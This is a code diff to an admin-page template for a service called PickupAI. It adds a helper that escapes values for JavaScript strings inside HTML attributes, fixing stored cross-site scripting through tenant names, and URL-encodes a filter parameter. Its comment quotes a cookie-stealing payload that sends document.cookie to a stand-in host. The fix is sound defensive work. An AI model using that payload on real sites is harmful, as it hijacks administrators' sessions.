@@ -80,6 +80,30 @@ ${publicBaseUrl}/dashboard/login
 Questions? Email hello@getpickupai.com.au — PickupAI`;
 }
 
+/**
+ * Escape for a JAVASCRIPT STRING LITERAL that sits inside an HTML attribute.
+ *
+ * esc() is not enough there and the reason is easy to miss: the HTML parser
+ * decodes entities in an attribute value BEFORE the JS engine ever sees the
+ * string, so esc()'s `&#39;` turns back into a real apostrophe and closes the
+ * literal. A tenant name of  x');fetch('//evil/?c='+document.cookie);//  put
+ * arbitrary JS into the admin's session the moment an admin opened the page —
+ * and tenant names are set by anyone who can reach the public signup form,
+ * which validates trade_type and phone and does not validate the name.
+ *
+ * Backslash-escape for JS first, then esc() for HTML. Order matters: escaping
+ * HTML first would let the backslash pass turn `&amp;` into `&\amp;`.
+ */
+function escJsInAttr(s: string | null | undefined): string {
+  return esc(
+    (s ?? "")
+      .replace(/\\/g, "\\\\")
+      .replace(/'/g, "\\'")
+      .replace(/"/g, '\\"')
+      .replace(/\r?\n/g, "\\n")
+  );
+}
+
 function esc(s: string | null | undefined): string {
   return (s ?? "")
     .replace(/&/g, "&amp;")
@@ -869,7 +893,7 @@ export function adminUserDetailPage(detail: TenantDetail, publicBaseUrl: string,
       <div class="actions-panel">
         <form method="POST" action="/admin/users/${t.tenant_id}/reset-password">
           <button type="submit" class="btn btn-amber action-btn"
-            onclick="return confirm('Send a temporary password by SMS to ${esc(t.owner_phone)}?')">
+            onclick="return confirm('Send a temporary password by SMS to ${escJsInAttr(t.owner_phone)}?')">
             Send temp password by SMS
           </button>
           <div class="form-hint" style="text-align:center;margin-top:.3rem">Sends to ${esc(t.owner_phone)}</div>
@@ -882,7 +906,7 @@ export function adminUserDetailPage(detail: TenantDetail, publicBaseUrl: string,
         </form>
 
         <form method="POST" action="/admin/users/${t.tenant_id}/delete"
-          onsubmit="return confirm('Permanently delete ${esc(t.name)} and all their data? This cannot be undone.')">
+          onsubmit="return confirm('Permanently delete ${escJsInAttr(t.name)} and all their data? This cannot be undone.')">
           <button type="submit" class="btn btn-danger-outline action-btn">Delete account</button>
         </form>
       </div>
@@ -1757,7 +1781,7 @@ export function adminServiceRequestsPage(
   const pagination = totalPages > 1
     ? Array.from({ length: totalPages }, (_, i) => {
         const p = i + 1;
-        const qType = typeFilter ? `&type=${typeFilter}` : "";
+        const qType = typeFilter ? `&type=${encodeURIComponent(typeFilter)}` : "";
         return p === page
           ? `<span style="padding:.3rem .6rem;background:var(--brand);color:#fff;border-radius:4px;font-size:.8rem">${p}</span>`
           : `<a href="/admin/service-requests?page=${p}${qType}" style="padding:.3rem .6rem;color:var(--brand);font-size:.8rem">${p}</a>`;
